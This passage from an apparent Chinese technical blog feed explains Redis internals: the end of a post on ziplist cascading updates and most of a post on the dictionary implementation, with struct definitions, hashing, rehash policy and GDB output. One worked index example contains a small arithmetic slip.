<p>以下举例说明这个问题：给定一个长度为3的，每个节点大小均为253字节的ziplist，往表头插入一个300字节大小的节点。<br><img data-src="/2021/1230204524/image5.png"><br>注：除了新增节点会引发连锁更新，删除节点操作也可能引发连锁更新，此处不再赘述。</p>
<p><font color="red">思考问题：</font>既然连锁更新的最坏复杂度为O(n^2)，为什么Redis还是放心使用ziplist？</p>
<ul>
<li>因为连锁更新触发条件苛刻，只有满足存在多个连续长度为250-253之间的节点才能触发。</li>
<li>ziplist只应用于节点数少且数据小的场景，即使出现了连续更新，需要更新的节点数量也很少，不会出现性能问题。</li>
</ul>
<h2><span id="参考资料">参考资料</span></h2><p>【1】《Redis设计与实现》 第7章 压缩列表</p>
<p>【2】[Redis源码解析-基础数据-ziplist(压缩列表)](</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(三)——字典</title>
    <url>/2021/1221204034.html</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>字典是一种用于保存键值对的数据结构，Redis数据库使用字典做为底层实现，字典也是哈希键的底层实现之一。</p>
<p>C语言中并没有内置字典这个数据结构，Redis自己实现了字典。</p>
<p>以下结合源码分析Redis字典的设计与实现，源码版本：<a href="https://github.com/redis/redis/releases/tag/6.0.10">Redis 6.0.10</a></p>
<span id="more"></span>

<h2><span id="问题思考">问题思考</span></h2><p>C语言中如何设计一个通用的字典和哈希表？</p>
<ul>
<li><p><a href="#jump1">字典的设计与实现</a></p>
<ul>
<li><a href="#jump2">哈希表和哈希表节点的设计</a></li>
<li><a href="#jump3">字典的数据结构设计</a></li>
<li><a href="#jump4">如何设计多态字典</a></li>
</ul>
</li>
<li><p><a href="#jump5">哈希算法</a></p>
<ul>
<li><a href="#jump6">为什么数组长度设计为2的n次方</a></li>
</ul>
</li>
<li><p><a href="#jump7">如何解决键冲突</a></p>
</li>
<li><p><a href="#jump8">rehash操作</a></p>
<ul>
<li><a href="#jump9">为什么要rehash</a></li>
<li><a href="#jump10">rehash的实现步骤</a></li>
<li><a href="#jump11">为什么不直接复制ht[0]的节点到ht[1]，而是要重新计算哈希索引值再rehash</a></li>
</ul>
</li>
<li><p><a href="#jump12">rehash的触发条件是什么</a></p>
<ul>
<li><a href="#jump13">负载因子的概念</a></li>
<li><a href="#jump14">哈希表扩展策略</a></li>
<li><a href="#jump15">哈希表收缩策略</a></li>
</ul>
</li>
<li><p><a href="#jump16">渐进式rehash</a></p>
<ul>
<li><a href="#jump17">为什么要渐进式</a></li>
<li><a href="#jump18">渐进式rehash的实现</a></li>
<li><a href="#jump19">增、删、改、查场景中的rehash实现</a></li>
</ul>
</li>
<li><p><a href="#jump20">字典API</a></p>
<ul>
<li><a href="#jump21">随机返回一个键值对</a></li>
<li><a href="#jump22">字典迭代器的设计与实现</a></li>
<li><a href="#jump23">dictScan算法</a></li>
</ul>
</li>
</ul>
<h3><span id="字典的设计与实现">字典的设计与实现<span id="jump1"></span></span></h3><p>Redis中使用哈希表来实现字典，一个哈希表中有多个哈希表节点，每个节点存储一个键值对。</p>
<h4><span id="哈希表和哈希表节点的设计">哈希表和哈希表节点的设计<span id="jump2"></span></span></h4><p>哈希表的结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictht</span> &#123;</span></span><br><span class="line">    dictEntry **table;			<span class="comment">// 哈希表数组，每个数组是一个链表 (链地址法)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;			<span class="comment">// 记录哈希表大小</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sizemask;		<span class="comment">// 掩码，用于计算哈希索引，值总是等于size - 1</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> used;			<span class="comment">// 记录已有哈希表节点个数。</span></span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure>

<ul>
<li>table是一个指针数组，每个数组相当于一个链表；<strong>链地址法</strong>实现哈希表</li>
<li>size表示哈希表大小，取值总是为2的幂</li>
<li>sizemask为掩码，用于计算索引，取值总是为size - 1</li>
<li>used记录已有哈希表节点个数</li>
</ul>
<p>一个大小为4的空哈希表如下图：<br><img data-src="/2021/1221204034/image1.png"></p>
<p>哈希表节点的结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> *key;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">void</span> *val;</span><br><span class="line">		<span class="type">uint64_t</span> u64;</span><br><span class="line">		<span class="type">int64_t</span> s64;</span><br><span class="line">	&#125; v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>key保存键，对于哈希键场景，这个key存储的实际类型是sds</li>
<li>v保存值，设置为联合类型用于保存不同类型的值</li>
<li>next保存链表的下一个节点，以链地址法解决哈希键冲突问题</li>
<li>value保存值，用联合类型的好处是可以保存不同类型的值</li>
</ul>
<h4><span id="字典的数据结构设计">字典的数据结构设计<span id="jump3"></span></span></h4><p>字典的结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dict</span> &#123;</span></span><br><span class="line">    dictType *type;		     <span class="comment">// 类型特定函数</span></span><br><span class="line">    <span class="type">void</span> *privdata;</span><br><span class="line">    dictht ht[<span class="number">2</span>];			 <span class="comment">// 两个哈希表, ht[1]用于rehash</span></span><br><span class="line">    <span class="type">long</span> rehashidx; 		 <span class="comment">/* rehashing not in progress if rehashidx == -1 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> iterators; <span class="comment">/* number of iterators currently running */</span></span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure>

<h4><span id="如何设计多态字典">如何设计多态字典？<span id="jump4"></span></span></h4><p>type和privdata用于实现多态字典，dictType结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictType</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> (*hashFunction)(<span class="type">const</span> <span class="type">void</span> *key);			<span class="comment">// 计算hash值</span></span><br><span class="line">    <span class="type">void</span> *(*keyDup)(<span class="type">void</span> *privdata, <span class="type">const</span> <span class="type">void</span> *key);	<span class="comment">// 复制键</span></span><br><span class="line">    <span class="type">void</span> *(*valDup)(<span class="type">void</span> *privdata, <span class="type">const</span> <span class="type">void</span> *obj);	<span class="comment">// 复制值</span></span><br><span class="line">    <span class="type">int</span> (*keyCompare)(<span class="type">void</span> *privdata, <span class="type">const</span> <span class="type">void</span> *key1, <span class="type">const</span> <span class="type">void</span> *key2);	<span class="comment">// 比较键</span></span><br><span class="line">    <span class="type">void</span> (*keyDestructor)(<span class="type">void</span> *privdata, <span class="type">void</span> *key);	<span class="comment">// 销毁键</span></span><br><span class="line">    <span class="type">void</span> (*valDestructor)(<span class="type">void</span> *privdata, <span class="type">void</span> *obj);	<span class="comment">// 销毁值</span></span><br><span class="line">&#125; dictType;</span><br></pre></td></tr></table></figure>

<p>考虑字典的增、删、改、查场景，每个场景必定会涉及如下动作：</p>
<ul>
<li><p>哈希值的计算</p>
</li>
<li><p>键、值的复制</p>
</li>
<li><p>键、值的销毁</p>
</li>
<li><p>比较两个键是否相同</p>
</li>
</ul>
<p>对于不同类型的键值对，以上这些动作的具体实现必定是有差异的。设计dictType的好处在于，通过挂接钩子函数消除这个差异，简化了字典的增、删、改、查等API的实现。（比如复制键的场景，不同类型的键值对只需调用同一个钩子函数<code>keyDup</code>即可）</p>
<p>钩子函数的挂接，在字典创建时完成，参考<code>dictCreate</code>， 时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dict *<span class="title function_">dictCreate</span><span class="params">(dictType *type, <span class="type">void</span> *privDataPtr)</span> &#123;</span><br><span class="line">    dict *d = zmalloc(<span class="keyword">sizeof</span>(*d));</span><br><span class="line">    _dictInit(d,type,privDataPtr);</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _dictInit(dict *d, dictType *type, <span class="type">void</span> *privDataPtr) &#123;</span><br><span class="line">    _dictReset(&amp;d-&gt;ht[<span class="number">0</span>]);</span><br><span class="line">    _dictReset(&amp;d-&gt;ht[<span class="number">1</span>]);</span><br><span class="line">    d-&gt;type = type;				<span class="comment">// 挂接钩子函数</span></span><br><span class="line">    d-&gt;privdata = privDataPtr;</span><br><span class="line">    d-&gt;rehashidx = <span class="number">-1</span>;</span><br><span class="line">    d-&gt;iterators = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> DICT_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ht是一个数组，包含2个哈希表。一般情况下只会用到ht[0]，ht[1]用于字典的rehash操作。</p>
</li>
<li><p>rehashidx表示字典rehash的进度，取值为-1表示没有进行rehash。</p>
</li>
</ul>
<p><strong>举例：</strong></p>
<p>新增一个哈希键key，4个键值对。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmset key key1 value1 key2 value2 key3 value3 key4 value4</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; object encoding key</span><br><span class="line">&quot;hashtable&quot;</span><br><span class="line">127.0.0.1:6379&gt; hgetall key</span><br><span class="line">1) &quot;key2&quot;</span><br><span class="line">2) &quot;value2&quot;</span><br><span class="line">3) &quot;key4&quot;</span><br><span class="line">4) &quot;value4&quot;</span><br><span class="line">5) &quot;key1&quot;</span><br><span class="line">6) &quot;value1&quot;</span><br><span class="line">7) &quot;key3&quot;</span><br><span class="line">8) &quot;value3&quot;</span><br></pre></td></tr></table></figure>

<p>注：必须先修改redis配置项<code>hash-max-ziplist-value</code>（这个例子中要设置为4），否则这里的哈希键默认编码方式为<code>ziplist</code>，而不是<code>hashtable</code> ！</p>
<p><strong>GDB打印这个字典，具体方法如下：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、打印哈希键key，在0号数据库键空间中先找到这个key。</span></span><br><span class="line">(gdb) p (sds)server.db[<span class="number">0</span>].dict.ht[<span class="number">0</span>].table[<span class="number">1</span>].key</span><br><span class="line">$<span class="number">1</span> = (sds) <span class="number">0x564377c118c1</span> <span class="string">&quot;key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、打印哈希键的值, 注意值也是一个字典结构，有4个键值对</span></span><br><span class="line">(gdb) p *(robj *)server.db[<span class="number">0</span>].dict.ht[<span class="number">0</span>].table[<span class="number">1</span>].v</span><br><span class="line">$<span class="number">2</span> = &#123;type = <span class="number">4</span>, encoding = <span class="number">2</span>, lru = <span class="number">12185874</span>, refcount = <span class="number">1</span>, ptr = <span class="number">0x564377c20450</span>&#125; <span class="comment">// 字典位于0x564377c20450地址处</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_HASH 4 			<span class="comment">/* Hash object. type = 4*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ENCODING_HT 2   <span class="comment">/* Encoded as hash table， encoding = 2 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、打印这个字典</span></span><br><span class="line">(gdb) <span class="built_in">set</span> print pretty on</span><br><span class="line">(gdb) p *(dict *)<span class="number">0x564377c20450</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  type = <span class="number">0x5643777e4860</span> &lt;hashDictType&gt;,</span><br><span class="line">  privdata = <span class="number">0x0</span>,</span><br><span class="line">  ht = &#123;&#123;							</span><br><span class="line">      table = <span class="number">0x564377c10eb0</span>, <span class="comment">// 哈希表地址0x564377c10eb0</span></span><br><span class="line">      size = <span class="number">4</span>,</span><br><span class="line">      sizemask = <span class="number">3</span>,</span><br><span class="line">      used = <span class="number">4</span></span><br><span class="line">    &#125;, &#123;			<span class="comment">// ht[1]用于rehash，一般情况下rehashidx=-1，ht[1]用不上</span></span><br><span class="line">      table = <span class="number">0x0</span>,</span><br><span class="line">      size = <span class="number">0</span>,</span><br><span class="line">      sizemask = <span class="number">0</span>,</span><br><span class="line">      used = <span class="number">0</span></span><br><span class="line">    &#125;&#125;,</span><br><span class="line">  rehashidx = <span class="number">-1</span>,	<span class="comment">// 等于-1表示没有进行rehash</span></span><br><span class="line">  iterators = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4、打印字典中的哈希表，哈希表中的指针数组长度为4</span></span><br><span class="line"><span class="comment">// 索引0的链表长度为1，内容：(key, value2) -&gt; NULL</span></span><br><span class="line">(gdb) p ((dictEntry **)<span class="number">0x564377c10eb0</span>)[<span class="number">0</span>]</span><br><span class="line">$<span class="number">4</span> = (dictEntry *) <span class="number">0x564377c1a250</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a250</span>)-&gt;key</span><br><span class="line">$<span class="number">5</span> = (sds) <span class="number">0x564377c10ee1</span> <span class="string">&quot;key2&quot;</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a250</span>)-&gt;v</span><br><span class="line">$<span class="number">6</span> = (sds) <span class="number">0x564377c1a231</span> <span class="string">&quot;value2&quot;</span></span><br><span class="line">(gdb) p ((dictEntry *) <span class="number">0x564377c1a250</span>)-&gt;next</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> dictEntry *) <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 索引1的链表长度为0</span></span><br><span class="line">(gdb) p ((dictEntry **)<span class="number">0x564377c10eb0</span>)[<span class="number">1</span>]</span><br><span class="line">$<span class="number">8</span> = (dictEntry *) <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 索引2的链表长度为2，内容：(key4, value4) -&gt; (key1, value1)</span></span><br><span class="line">(gdb) p ((dictEntry **)<span class="number">0x564377c10eb0</span>)[<span class="number">2</span>]</span><br><span class="line">$<span class="number">9</span> = (dictEntry *) <span class="number">0x564377c0f530</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c0f530</span>)-&gt;key</span><br><span class="line">$<span class="number">10</span> = (sds) <span class="number">0x564377c1a1b1</span> <span class="string">&quot;key4&quot;</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c0f530</span>)-&gt;v</span><br><span class="line">$<span class="number">11</span> = (sds) <span class="number">0x564377c1a1d1</span> <span class="string">&quot;value4&quot;</span></span><br><span class="line">(gdb) p ((dictEntry *) <span class="number">0x564377c0f530</span>)-&gt;next</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">struct</span> dictEntry *) <span class="number">0x564377c1a500</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a500</span>)-&gt;key</span><br><span class="line">$<span class="number">13</span> = (sds) <span class="number">0x564377c10dd1</span> <span class="string">&quot;key1&quot;</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a500</span>)-&gt;v</span><br><span class="line">$<span class="number">14</span> = (sds) <span class="number">0x564377c1a4e1</span> <span class="string">&quot;value1&quot;</span></span><br><span class="line">(gdb) p ((dictEntry *) <span class="number">0x564377c1a500</span>)-&gt;next</span><br><span class="line">$<span class="number">15</span> = (<span class="keyword">struct</span> dictEntry *) <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 索引3的链表长度为1, 内容：(key3, value3) -&gt; NULL</span></span><br><span class="line">(gdb) p ((dictEntry **)<span class="number">0x564377c10eb0</span>)[<span class="number">3</span>]</span><br><span class="line">$<span class="number">16</span> = (dictEntry *) <span class="number">0x564377c1a190</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a190</span>)-&gt;key</span><br><span class="line">$<span class="number">17</span> = (sds) <span class="number">0x564377c1a151</span> <span class="string">&quot;key3&quot;</span></span><br><span class="line">(gdb) p (sds)((dictEntry *) <span class="number">0x564377c1a190</span>)-&gt;v</span><br><span class="line">$<span class="number">18</span> = (sds) <span class="number">0x564377c1a171</span> <span class="string">&quot;value3&quot;</span></span><br><span class="line">(gdb) p ((dictEntry *) <span class="number">0x564377c1a171</span>)-&gt;next</span><br><span class="line">$<span class="number">19</span> = (<span class="keyword">struct</span> dictEntry *) <span class="number">0x0</span></span><br></pre></td></tr></table></figure>



<p>下图展示了这个字典：<br><img data-src="/2021/1221204034/image2.png"></p>
<h3><span id="哈希算法">哈希算法<span id="jump5"></span></span></h3><p>Redis内置两种哈希算法：</p>
<ul>
<li><code>dictGenHashFunction</code> 用于字符串哈希，区分大小写。</li>
<li><code>dictGenCaseHashFunction</code>用于字符串哈希，不区分大小写。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The default hashing function uses SipHash implementation in siphash.c. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">dictGenHashFunction</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *key, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> siphash(key,len,dict_hash_function_seed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">dictGenCaseHashFunction</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> siphash_nocase(buf,len,dict_hash_function_seed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>索引值如何计算？</strong></p>
<p>先通过哈希算法求出64位的哈希值，再利用这个哈希值和sizemask掩码得到索引值，源码参考<code>_dictKeyIndex</code>，这里简单给出伪代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回key的索引值。</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">GetKeyIndex</span><span class="params">(dict *d, <span class="type">const</span> <span class="type">void</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> hash = dictGenHashFunction((<span class="type">unsigned</span> <span class="type">char</span> *)key, <span class="built_in">strlen</span>((<span class="type">char</span> *)key));</span><br><span class="line">	<span class="keyword">return</span> hash &amp; dict-&gt;ht[<span class="number">0</span>].sizemask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>举例：一个大小为4的空哈希表，新增一个键值对(k0, v0)， 假设通过哈希算法求出的哈希值为666，按照上面的伪代码，求出索引值为 666 % ( 4 - 1) &#x3D; 0，这说明这个节点需要插入到第0个哈希表数组，如图所示：</p>
<p><img data-src="/2021/1221204034/image3.png"></p>
<p><strong>REDIS 3.0中的哈希算法</strong></p>
<p>使用Murmurhash2算法计算键的哈希值，返回uint32_t类型的哈希值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">dictGenHashFunction</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *key, <span class="type">int</span> len)</span>;</span><br></pre></td></tr></table></figure>



<h4><span id="为什么哈希表数组长度设计为2的n次方有什么好处">为什么哈希表数组长度设计为2的n次方，有什么好处？<span id="jump6"></span></span></h4><p><strong>好处1</strong>：保证哈希表元素分布均匀，减少哈希冲突。以下举例说明：</p>
<ul>
<li><p>如果哈希表长度size不设置为2的n次方（比如这里设为15），那sizemask &#x3D; 14, 二进制表示：1110；这时假设我要插两个元素，哈希值分别是6 (110), 7 (111)，分别与1110进行与运算后，两者得到的结果是相同的，因此这两个元素存储到同一个链表中，导致效率低下。</p>
</li>
<li><p>如果size设计为2的n次方(比如16），sizemask的二进制为15，二进制表示：1111，此时哈希值6和7分别与1111运行与运算后得到结果110和111，因此这两个元素存储到不同的链表，保证了哈希表元素分布均匀。</p>
</li>
</ul>
<p><strong>好处2</strong>：利用位运算比取模运算更快的特点，提高求哈希索引的效率。</p>
<p>计算哈希索引的本质是取模求余数，但计算机不擅长做模运算，更擅长做位运算。我们注意到，只有在size是2的幂的条件下， 等式<code>hash &amp; (size - 1) == hash % size  </code>才成立。</p>
<p>附：<a href="https://www.codeprj.com/blog/acae4c1.html">位运算和取模运算的运算效率对比</a></p>
<h3><span id="如何解决键冲突">如何解决键冲突<span id="jump7"></span></span></h3><p>常见的解决哈希冲突方法：</p>
<ul>
<li>开放寻址法 （线性探查法，平方探查法等）</li>
<li>链地址法</li>
<li>再哈希法</li>
<li>……</li>
</ul>
<p>Redis中使用<strong>链地址法</strong>解决哈希键冲突，即将同一个索引值的多个哈希表节点通过单链表连接起来。</p>
<p>链地址法优点是实现简单，适用于预先不知道哈希表数据大小，插入删除频繁的场景。</p>
<h3><span id="rehash操作">rehash操作<span id="jump8"></span></span></h3><h4><span id="为什么要rehash">为什么要rehash？<span id="jump9"></span></span></h4><p>哈希表的扩容和收缩操作通过rehash完成，rehash的目的在于将哈希表的负载因子(键的个数 &#x2F; 哈希表大小)始终维持在合理范围内，以达到最优的时间和空间性能。</p>
<p>如果不设计字典的rehash动作，试考虑以下两个场景中的问题：</p>
<ul>
<li>新增大量的键值对到哈希表，查询某个键的时间复杂度从O(1)退化到O(N)，时间性能差。</li>
<li>考虑一个保存大量键值对的哈希表，删除这个表的所有键后，哈希表数组的空间并没有释放，出现内存占用高甚至内存不足的问题，空间性能差。</li>
</ul>
<p>综上，必须设计字典的rehash动作，当哈希表保存键值对过多或过少时，对哈希表进行动态地扩容和收缩。</p>
<h4><span id="rehash的实现步骤">rehash的实现步骤<span id="jump10"></span></span></h4><p>1、为字典的ht[1]分配空间，分配的空间大小取决于执行的操作(扩展或收缩）, 以及当前键值对数目（即ht[0].used的值），源码参考<code>_dictExpandIfNeeded</code></p>
<ul>
<li>如执行扩展操作，ht[1]的size设置为ht[0].used * 2, 参考<code>dictExpand</code></li>
<li>如执行收缩操作，ht[1]的size设置为ht[0].used，参考<code>dictResize</code></li>
</ul>
<p>2、将ht[0]的所有键值对rehash到ht[1]，即重新计算ht[0]中所有键值对在ht[1]上的索引值，再将所有键值对加入ht[1]</p>
<p>3、ht[0]中所有键值对完成rehash后，释放ht[0], 将ht[0]指向ht[1]，ht[1]置为空哈希表，为下一次rehash做准备。 </p>
<p><strong>举例：</strong></p>
<p>假设这里对一个大小为4的字典做扩展操作，字典初始状态如下图：<br><img data-src="/2021/1221204034/image4.png"></p>
<p>1、为字典的ht[1]分配空间，大小为 4 * 2 &#x3D; 8，分配空间后的字典如下图：</p>
<p><img data-src="/2021/1221204034/image5.png"></p>
<p>2、将ht[0]的所有4个键值对rehash到ht[1]，假设重新计算得到的索引值为2, 3, 6, 7，如下图：<br><img data-src="/2021/1221204034/image6.png"></p>
<p>3、释放ht[0]，将ht[0]指向ht[1], ht[1]置为空哈希表。和最初的字典对比，我们成功将哈希表的大小从4扩展到了8，如下图：</p>
<p><img data-src="/2021/1221204034/image7.png"></p>
<p>至此，我们搞清楚了为啥REDIS要在dict结构体中设计两个哈希表，原因如下：</p>
<ul>
<li><p>rehash过程中简化两个哈希表之间的数据迁移替换操作。</p>
</li>
<li><p>用于实现渐进式的rehash，参考<a href="#jump16">渐进式rehash</a></p>
</li>
</ul>
<h4><span id="为什么不直接复制ht0的节点到ht1而是要重新计算哈希索引值再rehash">为什么不直接复制ht[0]的节点到ht[1]，而是要重新计算哈希索引值再rehash？<span id="jump11"></span></span></h4><p>先看下索引值如何计算的: idx &#x3D; <code>hashcode &amp; (dict-&gt;size - 1)</code></p>
<p>注意到，rehash之后哈希数组的大小发生了变化，所以索引值必须重新计算。</p>
<h3><span id="rehash的触发条件是什么">rehash的触发条件是什么<span id="jump12"></span></span></h3><p>rehash操作会导致哈希表的扩展或收缩，以下分别讨论哈希表扩展、哈希表收缩两个场景是如何触发的。</p>
<h4><span id="负载因子的概念">负载因子的概念<span id="jump13"></span></span></h4><p>这里先给出哈希表负载因子的定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">load_factor = ht[<span class="number">0</span>].used / ht[<span class="number">0</span>].size;</span><br></pre></td></tr></table></figure>

<p>可以看出，负载因子大于1时，说明一定出现了哈希冲突。</p>
<h4><span id="哈希表扩展策略">哈希表扩展策略<span id="jump14"></span></span></h4><p>以下条件中满足任意一个，即自动触发哈希表的扩展操作：</p>
<ul>
<li>Redis服务器没有执行<code>BGSAVE</code>或<code>BGREWRITEAOF</code>命令，且哈希表负载因子大于等于1</li>
<li>Redis服务器正在执行<code>BGSAVE</code>或<code>BGREWRITEAOF</code>命令，且哈希表负载因子大于等于5</li>
</ul>
<p><strong>说明</strong>：执行<code>BGSAVE</code>或<code>BGREWRITEAOF</code>操作时，Redis会fork一个子进程。为了充分利用写时复制(Copy On Write)技术，在子进程存在期间，Redis服务器会提高负载因子，避免子进程存在期间进行哈希表扩展操作，引入不必要的内存写入，从而提高性能。</p>
<p>哈希表扩展策略的源码参考<code>_dictExpandifNeeded</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> dict_can_resize = <span class="number">1</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> dict_force_resize_ratio = <span class="number">5</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> _dictExpandIfNeeded(dict *d) &#123;</span><br><span class="line">    <span class="comment">/* Incremental rehashing already in progress. Return. */</span></span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) <span class="keyword">return</span> DICT_OK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the hash table is empty expand it to the initial size. */</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].size == <span class="number">0</span>) <span class="keyword">return</span> dictExpand(d, DICT_HT_INITIAL_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we reached the 1:1 ratio, and we are allowed to resize the hash</span></span><br><span class="line"><span class="comment">     * table (global setting) or we should avoid it but the ratio between</span></span><br><span class="line"><span class="comment">     * elements/buckets is over the &quot;safe&quot; threshold, we resize doubling</span></span><br><span class="line"><span class="comment">     * the number of buckets. */</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].used &gt;= d-&gt;ht[<span class="number">0</span>].size &amp;&amp;		<span class="comment">// 哈希表扩展的条件</span></span><br><span class="line">        (dict_can_resize ||</span><br><span class="line">         d-&gt;ht[<span class="number">0</span>].used/d-&gt;ht[<span class="number">0</span>].size &gt; dict_force_resize_ratio))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dictExpand(d, d-&gt;ht[<span class="number">0</span>].used*<span class="number">2</span>);	<span class="comment">// 扩展操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DICT_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dictEnableResize</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    dict_can_resize = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dictDisableResize</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    dict_can_resize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateDictResizePolicy</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果没有活跃的子进程，dict_can_resize写1，否则写0</span></span><br><span class="line">    <span class="keyword">if</span> (!hasActiveChildProcess())	<span class="comment">// (bgsave, bgwriteaof这些后台持久化操作在fork出的子进程中进行！</span></span><br><span class="line">        dictEnableResize();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dictDisableResize();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hasActiveChildProcess</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> server.rdb_child_pid != <span class="number">-1</span> ||</span><br><span class="line">           server.aof_child_pid != <span class="number">-1</span> ||</span><br><span class="line">           server.module_child_pid != <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="哈希表收缩策略">哈希表收缩策略<span id="jump15"></span></span></h4><p>哈希表的负载因子小于0.1时，Redis自动对哈希表做收缩操作。具体场景分析如下：</p>
<ul>
<li><p>删除哈希表中的某个键值对之后，通过<code>htNeedsResize</code>判断是否需对哈希表做收缩，参考<code>hdelCommand</code></p>
</li>
<li><p>Redis服务器的定时事件中，周期性地检查每个数据库键空间字典，调用<code>htNeedsResize</code>判断是否需对哈希表做收缩操作。</p>
</li>
</ul>
<p>哈希表收缩策略参考源码<code>htNeedsResize</code></p>
